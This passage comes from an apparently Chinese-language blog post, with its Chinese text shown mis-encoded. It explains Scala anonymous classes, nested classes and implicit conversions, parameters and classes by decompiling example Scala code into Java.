(InvocationTargetException var5) &#123;</span><br><span class="line">         <span class="keyword">throw</span> var5.getCause();</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="type">BoxedUnit</span> <span class="variable">var10000</span> <span class="operator">=</span> BoxedUnit.UNIT;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">private</span> AnonymousClass$() &#123;</span><br><span class="line">      MODULE$ = <span class="built_in">this</span>;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>åœ¨ä¼´ç”Ÿå¯¹è±¡çš„<code>main</code>æ–¹æ³•ä¸­ï¼Œé¦–å…ˆæ„é€ äº†ä¸€ä¸ª<code>Function1</code>ç±»å‹çš„åŒ¿åç±»å¯¹è±¡<code>runnable</code>ï¼Œåˆ›å»ºåŒ¿åç±»åè°ƒç”¨å…¶<code>apply</code>æ–¹æ³•ï¼ˆæ³¨å…¥å™¨ï¼‰è¿›è¡Œä¼ å‚ï¼Œå¦‚æ­¤ä¾¿å®Œæˆäº†æœ‰å‚åŒ¿åç±»çš„å®ä¾‹åŒ–ï¼Œç„¶åé€šè¿‡åå°„è¿›è¡Œæ–¹æ³•è°ƒç”¨ã€‚åŒ¿åç±»ã€åŒ¿åå‡½æ•°çš„ä¼ å‚ã€è°ƒç”¨å¤§é‡ä½¿ç”¨äº†<code>apply</code>æ–¹æ³•ï¼Œè¦åŠ ä»¥ç”„åˆ«ã€‚</p>
<h3 id="ç±»åµŒå¥—"><a href="#ç±»åµŒå¥—" class="headerlink" title="ç±»åµŒå¥—"></a>ç±»åµŒå¥—</h3><blockquote>
<p>æœ¬èŠ‚å°†æ¶‰åŠå˜é‡<code>$outer</code>çš„å«ä¹‰  </p>
</blockquote>
<p>æœ‰å¦‚ä¸‹ä»£ç å®šä¹‰åŒ¿åç±»<code>a</code>ï¼Œå…¶ä¸­åµŒå¥—åŒ¿åç±»<code>b</code>ï¼Œåœ¨åµŒå¥—åŒ¿åç±»<code>b</code>ä¸­è°ƒç”¨å¤–éƒ¨ç±»<code>a</code>çš„æ–¹æ³•ã€‚</p>
<figure class="highlight scala"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">object</span> <span class="title">AnonymousNested</span> </span>&#123;</span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">main</span></span>(args: <span class="type">Array</span>[<span class="type">String</span>]): <span class="type">Unit</span> = &#123;</span><br><span class="line">    <span class="keyword">val</span> a =<span class="keyword">new</span> <span class="type">Object</span> &#123;</span><br><span class="line">      <span class="keyword">val</span> b = <span class="keyword">new</span> <span class="type">Object</span> &#123;</span><br><span class="line">        <span class="function"><span class="keyword">def</span> <span class="title">printHelloNested</span></span>(): <span class="type">Unit</span> = &#123;</span><br><span class="line">          printHello()</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="function"><span class="keyword">def</span> <span class="title">printHello</span></span>(): <span class="type">Unit</span> = &#123;</span><br><span class="line">        println(<span class="string">&quot;Hello&quot;</span>)</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    a.b.printHelloNested()</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>å°†ä¸Šæ–‡ä»£ç åç¼–è¯‘ä¸º<code>Java</code>ä»£ç </p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//decompiled from AnonymousNested.class</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@ScalaSignature(</span></span><br><span class="line"><span class="meta">   bytes = &quot;ignored&quot;</span></span><br><span class="line"><span class="meta">)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">class</span> <span class="title class_">AnonymousNested</span> &#123;</span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(<span class="keyword">final</span> String[] args)</span> &#123;</span><br><span class="line">      AnonymousNested$.MODULE$.main(args);</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//decompiled from AnonymousNested$.class</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">class</span> <span class="title class_">AnonymousNested$</span> &#123;</span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">static</span> AnonymousNested$ MODULE$;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">static</span> &#123;</span><br><span class="line">      <span class="keyword">new</span> <span class="title class_">AnonymousNested$</span>();</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">static</span> Method reflMethod$Method1(<span class="keyword">final</span> Class x$<span class="number">1</span>) &#123;</span><br><span class="line">      <span class="type">StructuralCallSite</span> <span class="variable">methodCache1</span> <span class="operator">=</span> apply&lt;invokedynamic&gt;();</span><br><span class="line">      <span class="type">Method</span> <span class="variable">method1</span> <span class="operator">=</span> methodCache1.find(x$<span class="number">1</span>);</span><br><span class="line">      <span class="keyword">if</span> (method1 != <span class="literal">null</span>) &#123;</span><br><span class="line">         <span class="keyword">return</span> method1;</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">         method1 = .MODULE$.ensureAccessible(x$<span class="number">1.</span>getMethod(<span class="string">&quot;printHelloNested&quot;</span>, methodCache1.parameterTypes()));</span><br><span class="line">         methodCache1.add(x$<span class="number">1</span>, method1);</span><br><span class="line">         <span class="keyword">return</span> method1;</span><br><span class="line">      &#125;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">static</span> Method reflMethod$Method2(<span class="keyword">final</span> Class x$<span class="number">1</span>) &#123;</span><br><span class="line">      <span class="type">StructuralCallSite</span> <span class="variable">methodCache2</span> <span class="operator">=</span> apply&lt;invokedynamic&gt;();</span><br><span class="line">      <span class="type">Method</span> <span class="variable">method2</span> <span class="operator">=</span> methodCache2.find(x$<span class="number">1</span>);</span><br><span class="line">      <span class="keyword">if</span> (method2 != <span class="literal">null</span>) &#123;</span><br><span class="line">         <span class="keyword">return</span> method2;</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">         method2 = .MODULE$.ensureAccessible(x$<span class="number">1.</span>getMethod(<span class="string">&quot;b&quot;</span>, methodCache2.parameterTypes()));</span><br><span class="line">         methodCache2.add(x$<span class="number">1</span>, method2);</span><br><span class="line">         <span class="keyword">return</span> method2;</span><br><span class="line">      &#125;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(<span class="keyword">final</span> String[] args)</span> &#123;</span><br><span class="line">      <span class="type">Object</span> <span class="variable">a</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Object</span>() &#123;</span><br><span class="line">         <span class="keyword">private</span> <span class="keyword">final</span> <span class="type">Object</span> <span class="variable">b</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Object</span>(<span class="built_in">this</span>) &#123;</span><br><span class="line">            <span class="comment">// $FF: synthetic field</span></span><br><span class="line">            <span class="keyword">private</span> <span class="keyword">final</span> &lt;undefinedtype&gt; $outer;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">printHelloNested</span><span class="params">()</span> &#123;</span><br><span class="line">               <span class="built_in">this</span>.$outer.printHello();</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">public</span> &#123;</span><br><span class="line">               <span class="keyword">if</span> ($outer == <span class="literal">null</span>) &#123;</span><br><span class="line">                  <span class="keyword">throw</span> <span class="literal">null</span>;</span><br><span class="line">               &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                  <span class="built_in">this</span>.$outer = $outer;</span><br><span class="line">               &#125;</span><br><span class="line">            &#125;</span><br><span class="line">         &#125;;</span><br><span class="line"></span><br><span class="line">         <span class="keyword">public</span> Object <span class="title function_">b</span><span class="params">()</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">this</span>.b;</span><br><span class="line">         &#125;</span><br><span class="line"></span><br><span class="line">         <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">printHello</span><span class="params">()</span> &#123;</span><br><span class="line">            scala.Predef..MODULE$.println(<span class="string">&quot;Hello&quot;</span>);</span><br><span class="line">         &#125;</span><br><span class="line">      &#125;;</span><br><span class="line">      <span class="type">Object</span> <span class="variable">qual2</span> <span class="operator">=</span> a;</span><br><span class="line"></span><br><span class="line">      Object var10000;</span><br><span class="line">      <span class="keyword">try</span> &#123;</span><br><span class="line">         var10000 = reflMethod$Method2(qual2.getClass()).invoke(qual2);</span><br><span class="line">      &#125; <span class="keyword">catch</span> (InvocationTargetException var8) &#123;</span><br><span class="line">         <span class="keyword">throw</span> var8.getCause();</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="type">Object</span> <span class="variable">qual1</span> <span class="operator">=</span> var10000;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">try</span> &#123;</span><br><span class="line">         reflMethod$Method1(qual1.getClass()).invoke(qual1);</span><br><span class="line">      &#125; <span class="keyword">catch</span> (InvocationTargetException var7) &#123;</span><br><span class="line">         <span class="keyword">throw</span> var7.getCause();</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="type">BoxedUnit</span> <span class="variable">var9</span> <span class="operator">=</span> BoxedUnit.UNIT;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">private</span> AnonymousNested$() &#123;</span><br><span class="line">      MODULE$ = <span class="built_in">this</span>;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>åœ¨<code>main</code>æ–¹æ³•ä¸­åµŒå¥—åŒ¿åç±»bè°ƒç”¨å¤–éƒ¨ç±»aå°†å€ŸåŠ©è¾…åŠ©å˜é‡<code>$outer</code>ï¼Œ<code>$outer</code>å³è¡¨ç¤ºå½“å‰ç±»çš„å¤–éƒ¨ç±»ï¼Œå³ä¾¿å®ƒæ²¡æœ‰åˆ«æ˜¾å¼åœ°èµ‹å€¼ã€‚</p>
<h3 id="éšå¼è½¬æ¢"><a href="#éšå¼è½¬æ¢" class="headerlink" title="éšå¼è½¬æ¢"></a>éšå¼è½¬æ¢</h3><p>åœ¨<code>Java</code>ä¸­ï¼Œå¦‚æœå¼€å‘è€…éœ€è¦å®ç°ç±»åŠŸèƒ½çš„å¢å¼ºï¼Œä¸€èˆ¬é‡‡ç”¨ç»§æ‰¿ã€ä»£ç†ç”šè‡³äºä½¿ç”¨åŠ¨æ€æ’æ¡©æŠ€æœ¯æ¥å®ç°ï¼Œä½¿ç”¨è¿™äº›æŠ€æœ¯éƒ½éœ€è¦æ˜¾ç¤ºåœ°æ–°å¢æˆ–è€…ä¿®æ”¹ä»£ç ï¼Œä»è€Œæé«˜äº†ä»£ç çš„è€¦åˆæ€§ã€‚é‚£ä¹ˆæœ‰æ²¡æœ‰ä¸€ç§æ›´ç®€æ´ä¸”ä¸å…·å¤‡ä¾µå…¥æ€§çš„è§£å†³æ–¹æ¡ˆæ¥å®ç°è¿™äº›è¦æ±‚å‘¢ï¼Ÿ<code>Scala</code>ä¸ºå¼€å‘è€…æä¾›äº†ä¸€ç§è§£å†³æ–¹æ¡ˆã€‚<br>éšå¼è½¬æ¢å…è®¸å¼€å‘è€…åœ¨ä¸æ”¹å˜åŸæœ‰ä»£ç çš„æƒ…å†µä¸‹ï¼Œå¯¹ç°æœ‰ç±»å‹è¿›è¡Œæ‰©å±•æˆ–è€…æä¾›é¢å¤–çš„åŠŸèƒ½ã€‚éšå¼è½¬æ¢é€šå¸¸ç”¨äºå¢å¼ºç°æœ‰ç±»çš„åŠŸèƒ½ã€ä¸ºç°æœ‰ç±»æä¾›ç±»å‹è½¬æ¢æˆ–è€…ä¸ºå‡½æ•°æä¾›é¢å¤–çš„å‚æ•°ç­‰ã€‚</p>
<h4 id="éšå¼å‡½æ•°"><a href="#éšå¼å‡½æ•°" class="headerlink" title="éšå¼å‡½æ•°"></a>éšå¼å‡½æ•°</h4><p>çœ‹ä¸‹é¢çš„ä¾‹å­</p>
<figure class="highlight scala"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> scala.language.implicitConversions</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">object</span> <span class="title">ImplicitTransform</span> </span>&#123;</span><br><span class="line">  <span class="keyword">implicit</span> <span class="function"><span class="keyword">def</span> <span class="title">H2D</span></span>(h: <span class="type">Human</span>): <span class="type">Dog</span> = <span class="keyword">new</span> <span class="type">Dog</span>(h);</span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">main</span></span>(args: <span class="type">Array</span>[<span class="type">String</span>]): <span class="type">Unit</span> = &#123;</span><br><span class="line">    <span class="keyword">var</span> h = <span class="keyword">new</span> <span class="type">Human</span>()</span><br><span class="line">    h.bark()</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="class"><span class="keyword">class</span> <span class="title">Human</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="class"><span class="keyword">class</span> <span class="title">Dog</span>(<span class="params">h: <span class="type">Human</span></span>)</span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">bark</span></span>(): <span class="type">Unit</span> = &#123;</span><br><span class="line">      println(<span class="string">&quot;ä½ åœ¨ç‹—å«ä»€ä¹ˆ&quot;</span>)</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>åœ¨<code>main</code>æ–¹æ³•ä¸­ï¼Œé¦–å…ˆåˆ›å»ºäº†<code>Human</code>çš„å®ä¾‹å¯¹è±¡ï¼Œç„¶åè°ƒç”¨å…¶<code>bark</code>æ–¹æ³•ï¼Œè€Œåœ¨<code>Human</code>ç±»ä¸­å´æ²¡æœ‰å®šä¹‰æœ‰<code>bark</code>æ–¹æ³•ï¼ŒæŒ‰ç…§å…¶ä»–ç¼–ç¨‹è¯­è¨€çš„é€»è¾‘æ­¤æ—¶å°†å‘ç”Ÿç¼–è¯‘å¼‚å¸¸ï¼Œè€Œåœ¨Scalaä¸­å´åˆ«æœ‰æ´å¤©ï¼Œä»£ç å°†æˆåŠŸæ‰§è¡Œã€‚<br><img src="/archives/2a377379/image-2.png" alt="alt text"><br>è¿™ä¾¿æ˜¯<code>Scala</code>éšå¼è½¬æ¢çš„é­…åŠ›ï¼Œåœ¨ä¼´ç”Ÿå¯¹è±¡<code>ImplicitTransform</code>ä¸­é¢å¤–å®šä¹‰äº†ä¸€ä¸ªéšå¼æ–¹æ³•<code>H2D</code>,å…¶è´Ÿè´£å°†<code>Human</code>ç±»å‹è½¬æ¢ä¸º<code>Dog</code>ç±»å‹ï¼Œè¿™ä¸ªè¿‡ç¨‹æ˜¯å¼€å‘è€…ä¸å¯è§çš„ï¼Œæ˜¯éšè—ç€ç”±ç¼–è¯‘å™¨å¸®å¼€å‘è€…å®Œæˆçš„ã€‚åœ¨<code>Human</code>å¯¹è±¡å®ä¾‹å°è¯•è°ƒç”¨ä¸å­˜åœ¨çš„<code>bark</code>æ–¹æ³•æ—¶ï¼Œä¼šé¦–å…ˆå°è¯•å¯»æ‰¾å½“å‰ä¸Šä¸‹æ–‡ä¸­æ˜¯å¦å­˜åœ¨éšå¼è½¬æ¢å‡½æ•°è€Œä¸æ˜¯ç›´æ¥æŠ¥é”™é€€å‡ºï¼Œè‹¥å­˜åœ¨åˆ™åˆ¤æ–­è½¬æ¢åçš„ç»“æœæ˜¯å¦å­˜åœ¨<code>bark</code>æ–¹æ³•ï¼Œè‹¥å­˜åœ¨åˆ™è°ƒç”¨è¯¥<code>bark</code>æ–¹æ³•ã€‚<br>å°†<code>Scala</code>ä»£ç åç¼–è¯‘æˆ<code>Java</code>åè§‚å¯Ÿå‘ç°éšå¼è°ƒç”¨å˜æˆäº†æ˜¾å¼è°ƒç”¨ã€‚  </p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//decompiled from ImplicitTransform.class</span></span><br><span class="line"><span class="meta">@ScalaSignature(</span></span><br><span class="line"><span class="meta">   bytes = &quot;ignored&quot;</span></span><br><span class="line"><span class="meta">)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">class</span> <span class="title class_">ImplicitTransform</span> &#123;</span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(<span class="keyword">final</span> String[] args)</span> &#123;</span><br><span class="line">      ImplicitTransform$.MODULE$.main(args);</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">static</span> Dog <span class="title function_">H2D</span><span class="params">(<span class="keyword">final</span> Human h)</span> &#123;</span><br><span class="line">      <span class="keyword">return</span> ImplicitTransform$.MODULE$.H2D(h);</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">Dog</span> &#123;</span><br><span class="line">      <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">bark</span><span class="params">()</span> &#123;</span><br><span class="line">         .MODULE$.println(<span class="string">&quot;ä½ åœ¨ç‹—å«ä»€ä¹ˆ&quot;</span>);</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">public</span> <span class="title function_">Dog</span><span class="params">(<span class="keyword">final</span> Human h)</span> &#123;</span><br><span class="line">      &#125;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">Human</span> &#123;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//decompiled from ImplicitTransform$.class</span></span><br><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">class</span> <span class="title class_">ImplicitTransform$</span> &#123;</span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">static</span> ImplicitTransform$ MODULE$;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">static</span> &#123;</span><br><span class="line">      <span class="keyword">new</span> <span class="title class_">ImplicitTransform$</span>();</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">public</span> ImplicitTransform.Dog <span class="title function_">H2D</span><span class="params">(<span class="keyword">final</span> ImplicitTransform.Human h)</span> &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">ImplicitTransform</span>.Dog(h);</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(<span class="keyword">final</span> String[] args)</span> &#123;</span><br><span class="line">      ImplicitTransform.<span class="type">Human</span> <span class="variable">h</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ImplicitTransform</span>.Human();</span><br><span class="line">      <span class="built_in">this</span>.H2D(h).bark();</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">private</span> ImplicitTransform$() &#123;</span><br><span class="line">      MODULE$ = <span class="built_in">this</span>;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>åœ¨ä¸Šé¢æä¾›çš„ä»£ç ä¸­ï¼Œè§‚å¯Ÿå‘ç°<code>main</code>æ–¹æ³•é¦–å…ˆè°ƒç”¨äº†<code>H2D</code>æ–¹æ³•æ˜¾å¼å¾—å°†<code>Human</code>å¯¹è±¡è½¬æ¢ä¸º<code>Dog</code>å¯¹è±¡ï¼Œä¹‹åå†è°ƒç”¨<code>Dog</code>å¯¹è±¡çš„<code>bark</code>æ–¹æ³•ï¼Œè¿™ä¸ªè¿‡ç¨‹åœ¨<code>Java</code>ä»£ç ä¸­æ˜¯æ˜¾å¼çš„ã€‚  </p>
<h4 id="éšå¼å‚æ•°"><a href="#éšå¼å‚æ•°" class="headerlink" title="éšå¼å‚æ•°"></a>éšå¼å‚æ•°</h4><p>çœ‹ä¸‹é¢çš„ä»£ç   </p>
<figure class="highlight scala"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">object</span> <span class="title">ImplicitParameter</span> </span>&#123;</span><br><span class="line">  <span class="keyword">implicit</span> <span class="keyword">var</span> k: <span class="type">Int</span> = <span class="number">20</span></span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">main</span></span>(args: <span class="type">Array</span>[<span class="type">String</span>]): <span class="type">Unit</span> = &#123;</span><br><span class="line">    println(add(<span class="number">10</span>))</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">add</span></span>(x: <span class="type">Int</span>)(<span class="keyword">implicit</span> y: <span class="type">Int</span>): <span class="type">Int</span> = &#123;</span><br><span class="line">    x + y</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>æœ‰äº†å‰é¢éšå¼å‡½æ•°çš„ç ç‰åœ¨å‰ï¼Œç†è§£éšå¼å‚æ•°ä¹Ÿå°±ä¸å†å›°éš¾ã€‚åœ¨<code>main</code>æ–¹æ³•ä¸­è°ƒç”¨<code>add(x)</code>æ–¹æ³•ï¼Œå› ä¸ºè¯¥æ–¹æ³•å¹¶ä¸å­˜åœ¨ï¼Œé‚£ä¹ˆé¦–å…ˆåº”è¯¥å¯»æ‰¾å«æœ‰éšå¼å‚æ•°çš„æ–¹æ³•è°ƒç”¨ï¼Œå³<code>add(x: Int)(y: Int)</code>ï¼Œå…¶ä¸­<code>y: Int</code>ä¸ºéšå¼å‚æ•°ï¼Œåˆ™åœ¨å½“å‰ä¸Šä¸‹æ–‡ä¸­å¯»æ‰¾<code>Int</code>ç±»å‹çš„éšå¼å‚æ•°ï¼Œå³<code>k</code>ï¼Œæ•…<code>add(20)</code>æ–¹æ³•è°ƒç”¨çš„ç»“æœä¸º<code>30</code>ã€‚ éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œåœ¨åŒä¸€ä½œç”¨åŸŸä¸­ï¼ŒåŒä¸€ç±»å‹çš„éšå¼å‚æ•°åªèƒ½å‡ºç°ä¸€æ¬¡ï¼Œå¦åˆ™å°†äº§ç”Ÿç¼–è¯‘å™¨ç¼–è¯‘å¼‚å¸¸ã€‚å¦‚ä¸‹ä¾‹çš„ä»£ç æ˜¯ä¸è¢«å…è®¸çš„ï¼š  </p>
<figure class="highlight scala"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">object</span> <span class="title">ImplicitParameter</span> </span>&#123;</span><br><span class="line">  <span class="keyword">implicit</span> <span class="keyword">var</span> k: <span class="type">Int</span> = <span class="number">20</span></span><br><span class="line">  <span class="comment">// éšå¼å‚æ•°ç±»å‹ç±»å‹å†²çª</span></span><br><span class="line">  <span class="keyword">implicit</span> <span class="keyword">var</span> l: <span class="type">Int</span> = <span class="number">40</span></span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">main</span></span>(args: <span class="type">Array</span>[<span class="type">String</span>]): <span class="type">Unit</span> = &#123;</span><br><span class="line">    println(add(<span class="number">10</span>))</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">add</span></span>(x: <span class="type">Int</span>)(<span class="keyword">implicit</span> y: <span class="type">Int</span>): <span class="type">Int</span> = &#123;</span><br><span class="line">    x + y</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>åç¼–è¯‘åçš„ç»“æœäº¦éå¸¸æ¸…æ™°  </p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//decompiled from ImplicitParameter.class</span></span><br><span class="line"><span class="meta">@ScalaSignature(</span></span><br><span class="line"><span class="meta">   bytes = &quot;ignored&quot;</span></span><br><span class="line"><span class="meta">)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">class</span> <span class="title class_">ImplicitParameter</span> &#123;</span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">int</span> <span class="title function_">add</span><span class="params">(<span class="keyword">final</span> <span class="type">int</span> x, <span class="keyword">final</span> <span class="type">int</span> y)</span> &#123;</span><br><span class="line">      <span class="keyword">return</span> ImplicitParameter$.MODULE$.add(x, y);</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(<span class="keyword">final</span> String[] args)</span> &#123;</span><br><span class="line">      ImplicitParameter$.MODULE$.main(args);</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> k_$eq(<span class="keyword">final</span> <span class="type">int</span> x$<span class="number">1</span>) &#123;</span><br><span class="line">      ImplicitParameter$.MODULE$.k_$eq(x$<span class="number">1</span>);</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">int</span> <span class="title function_">k</span><span class="params">()</span> &#123;</span><br><span class="line">      <span class="keyword">return</span> ImplicitParameter$.MODULE$.k();</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//decompiled from ImplicitParameter$.class</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">class</span> <span class="title class_">ImplicitParameter$</span> &#123;</span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">static</span> ImplicitParameter$ MODULE$;</span><br><span class="line">   <span class="keyword">private</span> <span class="type">int</span> k;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">static</span> &#123;</span><br><span class="line">      <span class="keyword">new</span> <span class="title class_">ImplicitParameter$</span>();</span><br><span class="line">   &#125;</span><br><span class="line">    <span class="comment">// è·å–éšå¼å‚æ•°</span></span><br><span class="line">   <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">k</span><span class="params">()</span> &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="built_in">this</span>.k;</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">void</span> k_$eq(<span class="keyword">final</span> <span class="type">int</span> x$<span class="number">1</span>) &#123;</span><br><span class="line">      <span class="built_in">this</span>.k = x$<span class="number">1</span>;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(<span class="keyword">final</span> String[] args)</span> &#123;</span><br><span class="line">    <span class="comment">// è°ƒç”¨addæ–¹æ³•</span></span><br><span class="line">      .MODULE$.println(BoxesRunTime.boxToInteger(<span class="built_in">this</span>.add(<span class="number">10</span>, <span class="built_in">this</span>.k())));</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">add</span><span class="params">(<span class="keyword">final</span> <span class="type">int</span> x, <span class="keyword">final</span> <span class="type">int</span> y)</span> &#123;</span><br><span class="line">      <span class="keyword">return</span> x + y;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">private</span> ImplicitParameter$() &#123;</span><br><span class="line">      MODULE$ = <span class="built_in">this</span>;</span><br><span class="line">      <span class="comment">// éšå¼å‚æ•°èµ‹å€¼</span></span><br><span class="line">      <span class="built_in">this</span>.k = <span class="number">20</span>;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h4 id="éšå¼ç±»"><a href="#éšå¼ç±»" class="headerlink" title="éšå¼ç±»"></a>éšå¼ç±»</h4><p>çœ‹ä¸‹é¢çš„ä»£ç   </p>
<figure class="highlight scala"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> scala.annotation.tailrec</span><br><span class="line"><span class="keyword">import</span> scala.language.implicitConversions</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">object</span> <span class="title">ImplicitClass</span> </span>&#123;</span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">main</span></span>(args: <span class="type">Array</span>[<span class="type">String</span>]): <span class="type">Unit</span> = &#123;</span><br><span class="line">    <span class="number">4.</span>times(println(<span class="string">&quot;test&quot;</span>))</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">implicit</span> <span class="class"><span class="keyword">class</span> <span class="title">intWithTimes</span>(<span class="params">i: <span class="type">Int</span></span>)</span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">times</span></span>[<span class="type">A</span>](f: =&gt; <span class="type">A</span>): <span class="type">Unit</span> = &#123;</span><br><span class="line">      <span class="meta">@tailrec</span></span><br><span class="line">      <span class="function"><span class="keyword">def</span> <span class="title">loop</span></span>(c: <span class="type">Int</span>): <span class="type">Unit</span> = &#123;</span><br><span 